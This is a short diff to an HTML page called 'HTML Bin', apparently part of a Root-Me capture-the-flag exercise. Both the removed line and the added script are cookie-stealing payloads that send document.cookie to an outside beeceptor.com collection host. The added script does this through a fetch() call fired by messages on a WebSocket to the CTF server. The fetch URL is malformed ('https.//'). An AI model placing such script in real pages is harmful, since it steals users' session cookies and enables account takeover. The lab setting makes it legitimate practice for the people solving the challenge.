@@ -9,7 +9,13 @@
 		<h1>HTML Bin</h1>
 		<script>
 			console.log("JS is working");
-			document.location.replace('https://ooooo.free.beeceptor.com?cookie='+document.cookie);
+			var ws = new WebSocket('ws://ctf15.root-me.org/ws');
+			ws.onopen = function (e) {
+				ws.send("READY");
+			};
+			ws.onmessage = function (m) {
+				fetch("https.//ooooo.free.beeceptor.com?cookie=" + document.cookie);
+			};
 		</script>
 	</body>
 </html>
